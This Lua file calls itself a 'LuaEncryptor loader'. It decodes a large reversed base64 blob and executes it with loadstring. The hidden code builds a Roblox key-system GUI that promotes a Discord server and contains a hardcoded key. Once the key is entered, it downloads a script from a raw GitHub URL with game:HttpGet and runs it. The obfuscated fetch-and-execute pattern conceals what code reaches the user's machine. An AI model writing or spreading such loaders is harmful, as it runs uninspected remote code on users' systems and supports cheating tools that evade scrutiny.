--[[ LuaEncryptor loader ]]
local base64_chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='

local function base64_decode(data)
  data = data:gsub('%s', '')
  local result = {}
  local buffer = 0
  local bits_collected = 0
  for i = 1, #data do
    local c = data:sub(i, i)
    if c == '=' then
      break
    end
    local val = string.find(base64_chars, c, 1, true)
    if not val then
      error('Invalid Base64 character: ' .. c)
    end
    buffer = buffer * 64 + (val - 1)
    bits_collected = bits_collected + 6
    if bits_collected >= 8 then
      bits_collected = bits_collected - 8
      local byte = math.floor(buffer / (2 ^ bits_collected))
      buffer = buffer % (2 ^ bits_collected)
      result[#result + 1] = string.char(byte)
    end
  end
  return table.concat(result)
end

local function url_decode(value)
  value = value:gsub('%+', ' ')
  return value:gsub('%%(%x%x)', function(hex)
    return string.char(tonumber(hex, 16))
  end)
end

local function bxor(a, b)
  local res = 0
  local bit = 1
  while a > 0 or b > 0 do
    local aa = a % 2
    local bb = b % 2
    if aa ~= bb then
      res = res + bit
    end
    a = math.floor(a / 2)
    b = math.floor(b / 2)
    bit = bit * 2
  end
  return res
end

local function xor_decode(data, key)
  local raw = base64_decode(data)
  local result = {}
  local key_len = #key
  for i = 1, #raw do
    local payload_byte = raw:byte(i)
    local key_byte = key:byte(((i - 1) % key_len) + 1)
    result[i] = string.char(bxor(payload_byte, key_byte))
  end
  return table.concat(result)
end

local payload = [[O2VyaXVxZXIgLF0iMV9pdUduZWVyY1MiW0wyR01MIG5ydXRlcgopZG5lCmRuZSAgICAKIllFSyBSRVRORSIgPSB0eGVULl0iOV94b0J0eGVUIltMMkdNTCAgICAgICAgCm5laHQgIiIgPT0gdHhlVC5dIjlfeG9CdHhlVCJbTDJHTUwgZmkgICAgCikobm9pdGNudWYodGNlbm5vQzp0c29Mc3Vjb0YuXSI5X3hvQnR4ZVQiW0wyR01MCilkbmUKZG5lICAgIAoiIiA9IHR4ZVQuXSI5X3hvQnR4ZVQiW0wyR01MICAgICAgICAKbmVodCAiWUVLIFJFVE5FIiA9PSB0eGVULl0iOV94b0J0eGVUIltMMkdNTCBmaSAgICAKKShub2l0Y251Zih0Y2Vubm9DOmRlc3Vjb0YuXSI5X3hvQnR4ZVQiW0wyR01MCjspMCAsMCAsMChCR1Jtb3JmLjNyb2xvQyA9IF0iM3JvbG9DdHhlVCJbXSIxMV9sZWJhTHR4ZVQiW0wyR01MCjspODgxICwwICw4MSAsMCh3ZW4uMm1pRFUgPSBdIm5vaXRpc29QIltdIjExX2xlYmFMdHhlVCJbTDJHTUwKO11dWUVLIFRFRyBPVCBEUk9DU0lEIFlNIE5JT0pbWyA9IF0idHhlVCJbXSIxMV9sZWJhTHR4ZVQiW0wyR01MCjspNjEgLDAgLDAwMyAsMCh3ZW4uMm1pRFUgPSBdImV6aVMiW10iMTFfbGViYUx0eGVUIltMMkdNTAo7KWxhbXJvTi5lbHl0U3Rub0YubXVuRSAscmFsdWdlUi50aGdpZVd0bm9GLm11bkUgLF1dbm9zai5hdGFsb3Nub2NuSS9zZWlsaW1hZi9zdG5vZi8vOnRlc3NheGJyW1sod2VuLnRub0YgPSBdImVjYUZ0bm9GIltdIjExX2xlYmFMdHhlVCJbTDJHTUwKOyk5NzEgLDk3MSAsOTcxKEJHUm1vcmYuM3JvbG9DID0gXSIzcm9sb0NkbnVvcmdrY2FCIltdIjExX2xlYmFMdHhlVCJbTDJHTUwKMDIgb3QgNDEgbW9yZiBkZWduYWhDIC0tIDswMiA9IF0iZXppU3R4ZVQiW10iMTFfbGViYUx0eGVUIltMMkdNTAo7MCA9IF0ibGV4aVBlemlTcmVkcm9CIltdIjExX2xlYmFMdHhlVCJbTDJHTUwKOyldIjJfZW1hckYiW0wyR01MICwibGViYUx0eGVUIih3ZW4uZWNuYXRzbkkgPSBdIjExX2xlYmFMdHhlVCJbTDJHTUwKOyldImRfbm90dHVCdHhlVCJbTDJHTUwgLCJyZW5yb0NJVSIod2VuLmVjbmF0c25JID0gXSIwMV9yZW5yb0NJVSJbTDJHTUwKKWRuZQpkbmUgICAgCiIiID0gdHhlVC5dIjlfeG9CdHhlVCJbTDJHTUwgICAgICAgIAopOTcxICw5NzEgLDk3MShCR1Jtb3JmLjNyb2xvQyA9IDNyb2xvQ2RudW9yZ2tjYUIuXSJlX25vdHR1QnR4ZVQiW0wyR01MICAgICAgICAKIlRJTUJVUyIgPSB0eGVULl0iZV9ub3R0dUJ0eGVUIltMMkdNTCAgICAgICAgCikxKHRpYXcgICAgICAgIAopMCAsMCAsNTUyKEJHUm1vcmYuM3JvbG9DID0gM3JvbG9DZG51b3Jna2NhQi5dImVfbm90dHVCdHhlVCJbTDJHTUwgICAgICAgIAoiIURJTEFWTkkg4p2MIiA9IHR4ZVQuXSJlX25vdHR1QnR4ZVQiW0wyR01MICAgICAgICAKZXNsZSAgICAKKSh5b3J0c2VEOl0iMV9pdUduZWVyY1MiW0wyR01MICAgICAgICAKKTIodGlhdyAgICAgICAgCikodHBpcmNTZXR1Y2V4ZSAgICAgICAgCikwICw1NTIgLDAoQkdSbW9yZi4zcm9sb0MgPSAzcm9sb0NkbnVvcmdrY2FCLl0iZV9ub3R0dUJ0eGVUIltMMkdNTCAgICAgICAgCiIhREVUUEVDQ0Eg4pyFIiA9IHR4ZVQuXSJlX25vdHR1QnR4ZVQiW0wyR01MICAgICAgICAKbmVodCApeWVLZGVyZXRuZSh5ZUtldGFkaWxhdiBmaSAgICAKdHhlVC5dIjlfeG9CdHhlVCJbTDJHTUwgPSB5ZUtkZXJldG5lIGxhY29sICAgIAopKG5vaXRjbnVmKHRjZW5ub0M6a2NpbEMxbm90dHVCZXN1b00uXSJlX25vdHR1QnR4ZVQiW0wyR01MCjspXSJlX25vdHR1QnR4ZVQiW0wyR01MICwicmVucm9DSVUiKHdlbi5lY25hdHNuSSA9IF0iZl9yZW5yb0NJVSJbTDJHTUwKOykwICwwICwwKEJHUm1vcmYuM3JvbG9DID0gXSIzcm9sb0N0eGVUIltdImVfbm90dHVCdHhlVCJbTDJHTUwKOykwICwwICw2NjEgLDAod2VuLjJtaURVID0gXSJub2l0aXNvUCJbXSJlX25vdHR1QnR4ZVQiW0wyR01MCjtdXVRJTUJVU1tbID0gXSJ0eGVUIltdImVfbm90dHVCdHhlVCJbTDJHTUwKOyk0MyAsMCAsMjQxICwwKHdlbi4ybWlEVSA9IF0iZXppUyJbXSJlX25vdHR1QnR4ZVQiW0wyR01MCjspbGFtcm9OLmVseXRTdG5vRi5tdW5FICxyYWx1Z2VSLnRoZ2llV3Rub0YubXVuRSAsXV1ub3NqLmF0YWxvc25vY25JL3NlaWxpbWFmL3N0bm9mLy86dGVzc2F4YnJbWyh3ZW4udG5vRiA9IF0iZWNhRnRub0YiW10iZV9ub3R0dUJ0eGVUIltMMkdNTAo7KTk3MSAsOTcxICw5NzEoQkdSbW9yZi4zcm9sb0MgPSBdIjNyb2xvQ2RudW9yZ2tjYUIiW10iZV9ub3R0dUJ0eGVUIltMMkdNTAo7NDEgPSBdImV6aVN0eGVUIltdImVfbm90dHVCdHhlVCJbTDJHTUwKOzAgPSBdImxleGlQZXppU3JlZHJvQiJbXSJlX25vdHR1QnR4ZVQiW0wyR01MCjspXSJkX25vdHR1QnR4ZVQiW0wyR01MICwibm90dHVCdHhlVCIod2VuLmVjbmF0c25JID0gXSJlX25vdHR1QnR4ZVQiW0wyR01MCilkbmUKIkRST0NTSUQiID0gdHhlVC5dImRfbm90dHVCdHhlVCJbTDJHTUwgICAgCikxKHRpYXcgICAgCiIhREVJUE9DIiA9IHR4ZVQuXSJkX25vdHR1QnR4ZVQiW0wyR01MICAgIAopIjhmRTVONlpSWi9nZy5kcm9jc2lkLy86c3B0dGgiKGRyYW9icGlsY3RlcyAgICAKKShub2l0Y251Zih0Y2Vubm9DOmtjaWxDMW5vdHR1QmVzdW9NLl0iZF9ub3R0dUJ0eGVUIltMMkdNTAo7KTAgLDAgLDAoQkdSbW9yZi4zcm9sb0MgPSBdIjNyb2xvQ3R4ZVQiW10iZF9ub3R0dUJ0eGVUIltMMkdNTAo7KTgxMSAsMCAsNDEgLDAod2VuLjJtaURVID0gXSJub2l0aXNvUCJbXSJkX25vdHR1QnR4ZVQiW0wyR01MCjtdXURST0NTSURbWyA9IF0idHhlVCJbXSJkX25vdHR1QnR4ZVQiW0wyR01MCjspNDMgLDAgLDI0MSAsMCh3ZW4uMm1pRFUgPSBdImV6aVMiW10iZF9ub3R0dUJ0eGVUIltMMkdNTAo7KWxhbXJvTi5lbHl0U3Rub0YubXVuRSAscmFsdWdlUi50aGdpZVd0bm9GLm11bkUgLF1dbm9zai5hdGFsb3Nub2NuSS9zZWlsaW1hZi9zdG5vZi8vOnRlc3NheGJyW1sod2VuLnRub0YgPSBdImVjYUZ0bm9GIltdImRfbm90dHVCdHhlVCJbTDJHTUwKOyk5NzEgLDk3MSAsOTcxKEJHUm1vcmYuM3JvbG9DID0gXSIzcm9sb0NkbnVvcmdrY2FCIltdImRfbm90dHVCdHhlVCJbTDJHTUwKOzQxID0gXSJlemlTdHhlVCJbXSJkX25vdHR1QnR4ZVQiW0wyR01MCjswID0gXSJsZXhpUGV6aVNyZWRyb0IiW10iZF9ub3R0dUJ0eGVUIltMMkdNTAo7KV0iMl9lbWFyRiJbTDJHTUwgLCJub3R0dUJ0eGVUIih3ZW4uZWNuYXRzbkkgPSBdImRfbm90dHVCdHhlVCJbTDJHTUwKOyldIjlfeG9CdHhlVCJbTDJHTUwgLCJ0dW95YUxlZ2FQSVUiKHdlbi5lY25hdHNuSSA9IF0iY190dW95YUxlZ2FQSVUiW0wyR01MCjspXSI5X3hvQnR4ZVQiW0wyR01MICwidHVveWFMdHNpTElVIih3ZW4uZWNuYXRzbkkgPSBdImJfdHVveWFMdHNpTElVIltMMkdNTAo7KV0iOV94b0J0eGVUIltMMkdNTCAsInJlbnJvQ0lVIih3ZW4uZWNuYXRzbkkgPSBdImFfcmVucm9DSVUiW0wyR01MCjspMCAsMCAsMChCR1Jtb3JmLjNyb2xvQyA9IF0iM3JvbG9DdHhlVCJbXSI5X3hvQnR4ZVQiW0wyR01MCjtdXVlFSyBSRVRORVtbID0gXSJ0eGVUIltdIjlfeG9CdHhlVCJbTDJHTUwKOykyNiAsMCAsNDQgLDAod2VuLjJtaURVID0gXSJub2l0aXNvUCJbXSI5X3hvQnR4ZVQiW0wyR01MCjspNDMgLDAgLDg0MiAsMCh3ZW4uMm1pRFUgPSBdImV6aVMiW10iOV94b0J0eGVUIltMMkdNTAo7KWxhbXJvTi5lbHl0U3Rub0YubXVuRSAscmFsdWdlUi50aGdpZVd0bm9GLm11bkUgLF1dbm9zai5hdGFsb3Nub2NuSS9zZWlsaW1hZi9zdG5vZi8vOnRlc3NheGJyW1sod2VuLnRub0YgPSBdImVjYUZ0bm9GIltdIjlfeG9CdHhlVCJbTDJHTUwKOzQxID0gXSJlemlTdHhlVCJbXSI5X3hvQnR4ZVQiW0wyR01MCjspOTcxICw5NzEgLDk3MShCR1Jtb3JmLjNyb2xvQyA9IF0iM3JvbG9DZG51b3Jna2NhQiJbXSI5X3hvQnR4ZVQiW0wyR01MCjswID0gXSJsZXhpUGV6aVNyZWRyb0IiW10iOV94b0J0eGVUIltMMkdNTAo7KV0iMl9lbWFyRiJbTDJHTUwgLCJ4b0J0eGVUIih3ZW4uZWNuYXRzbkkgPSBdIjlfeG9CdHhlVCJbTDJHTUwKOyldIjVfbGViYUx0eGVUIltMMkdNTCAsInRuZWlkYXJHSVUiKHdlbi5lY25hdHNuSSA9IF0iOF90bmVpZGFyR0lVIltMMkdNTAo7KV0iNV9sZWJhTHR4ZVQiW0wyR01MICwidHVveWFMdHNpTElVIih3ZW4uZWNuYXRzbkkgPSBdIjdfdHVveWFMdHNpTElVIltMMkdNTAo7KV0iNV9sZWJhTHR4ZVQiW0wyR01MICwicmVucm9DSVUiKHdlbi5lY25hdHNuSSA9IF0iNl9yZW5yb0NJVSJbTDJHTUwKOyk4ICwwICwyMSAsMCh3ZW4uMm1pRFUgPSBdIm5vaXRpc29QIltdIjVfbGViYUx0eGVUIltMMkdNTAo7XV1NRVRTWVMgWUVLIEdHS0lOSU1VRFtbID0gXSJ0eGVUIltdIjVfbGViYUx0eGVUIltMMkdNTAo7KTIzICwwICw0MTMgLDAod2VuLjJtaURVID0gXSJlemlTIltdIjVfbGViYUx0eGVUIltMMkdNTAo7KWxhbXJvTi5lbHl0U3Rub0YubXVuRSAscmFsdWdlUi50aGdpZVd0bm9GLm11bkUgLF1dbm9zai5hdGFsb3Nub2NuSS9zZWlsaW1hZi9zdG5vZi8vOnRlc3NheGJyW1sod2VuLnRub0YgPSBdImVjYUZ0bm9GIltdIjVfbGViYUx0eGVUIltMMkdNTAo7KTk3MSAsOTcxICw5NzEoQkdSbW9yZi4zcm9sb0MgPSBdIjNyb2xvQ2RudW9yZ2tjYUIiW10iNV9sZWJhTHR4ZVQiW0wyR01MCjAyIG90IDQxIG1vcmYgZGVnbmFoQyAtLSA7MDIgPSBdImV6aVN0eGVUIltdIjVfbGViYUx0eGVUIltMMkdNTAo7MCA9IF0ibGV4aVBlemlTcmVkcm9CIltdIjVfbGViYUx0eGVUIltMMkdNTAo7KV0iMl9lbWFyRiJbTDJHTUwgLCJsZWJhTHR4ZVQiKHdlbi5lY25hdHNuSSA9IF0iNV9sZWJhTHR4ZVQiW0wyR01MCjspXSIyX2VtYXJGIltMMkdNTCAsImVrb3J0U0lVIih3ZW4uZWNuYXRzbkkgPSBdIjRfZWtvcnRTSVUiW0wyR01MCjspXSIyX2VtYXJGIltMMkdNTCAsInJlbnJvQ0lVIih3ZW4uZWNuYXRzbkkgPSBdIjNfcmVucm9DSVUiW0wyR01MCjspMjIgLDAgLDQ5MSAsMCh3ZW4uMm1pRFUgPSBdIm5vaXRpc29QIltdIjJfZW1hckYiW0wyR01MCjspODAyICwwICw4MzMgLDAod2VuLjJtaURVID0gXSJlemlTIltdIjJfZW1hckYiW0wyR01MCjspNTggLDU4ICw1OChCR1Jtb3JmLjNyb2xvQyA9IF0iM3JvbG9DZG51b3Jna2NhQiJbXSIyX2VtYXJGIltMMkdNTAo7MCA9IF0ibGV4aVBlemlTcmVkcm9CIltdIjJfZW1hckYiW0wyR01MCjspXSIxX2l1R25lZXJjUyJbTDJHTUwgLCJlbWFyRiIod2VuLmVjbmF0c25JID0gXSIyX2VtYXJGIltMMkdNTApkbmUKZG5lICAgIAopIiF5bGx1ZnNzZWNjdXMgZGVkYW9sIHRwaXJjUyDinIUiKHRuaXJwICAgICAgICAKZXNsZSAgICAKKXJyZSAsIjp0cGlyY3MgZ25pZGFvbCByb3JyRSDinYwiKG5yYXcgICAgICAgIApuZWh0IHNzZWNjdXMgdG9uIGZpICAgIAopZG5lICAgIAopKCl0cGlyY1NnbmlydFNkYW9sKGduaXJ0c2Rhb2wgICAgICAgIAopKG5vaXRjbnVmKGxsYWNwID0gcnJlICxzc2VjY3VzIGxhY29sICAgIAopKHRwaXJjU2V0dWNleGUgbm9pdGNudWYgbGFjb2wKZG5lCnllS2xhZXIgPT0geWVLdHVwbmkgbnJ1dGVyICAgIAopeWVLdHVwbmkoeWVLZXRhZGlsYXYgbm9pdGNudWYgbGFjb2wKXV0pKCkpZXVydCwiaGN0YUNkbkFlbWFUL25pYW0vc2RhZWgvc2Zlci9nZy5raW5pbXVkL2J1aC1jY2NjaW5pbW9kbmF0c2lydC9tb2MudG5ldG5vY3Jlc3VidWh0aWcud2FyLy86c3B0dGgiKHRlR3B0dEg6ZW1hZyhnbmlydHNkYW9sW1sgPSB0cGlyY1NnbmlydFNkYW9sIGxhY29sCiJrSHdtZUZYb3BpIiA9IHllS2xhZXIgbGFjb2wKO2duaWxiaVMucm9pdmFoZUJ4ZWRuSVoubXVuRSA9IF0icm9pdmFoZUJ4ZWRuSVoiW10iMV9pdUduZWVyY1MiW0wyR01MCjspKSJpdUdyZXlhbFAiKGRsaWhDcm9GdGlhVzpyZXlhbFBsYWNvTC4pInNyZXlhbFAiKGVjaXZyZVN0ZUc6ZW1hZyAsIml1R25lZXJjUyIod2VuLmVjbmF0c25JID0gXSIxX2l1R25lZXJjUyJbTDJHTUwKO317ID0gTDJHTUwgbGFjb2w=]]

payload = base64_decode(payload)
payload = payload:reverse()
local loader = loadstring or load
if not loader then
  error('This Lua runtime does not support dynamic loading.')
end
local fn, err = loader(payload)
if fn then
  fn()
else
  error('Failed to load payload: ' .. tostring(err))
end
